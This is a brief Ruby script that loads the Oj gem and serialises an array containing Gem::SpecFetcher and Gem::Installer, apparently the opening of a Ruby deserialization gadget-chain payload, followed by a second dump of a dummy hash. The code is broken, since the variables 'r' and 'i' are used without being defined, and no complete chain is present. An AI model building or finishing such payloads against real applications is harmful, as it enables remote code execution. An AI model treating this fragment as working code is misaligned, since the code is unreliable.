require 'bundler/inline'

gemfile do
  source 'https://rubygems.org'
  gem 'oj', require: true
end

payload = Oj.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload


@inner_payload = {}
@inner_payload[i] = "dummy_value"
payload = Oj.dump(@inner_payload)
puts payload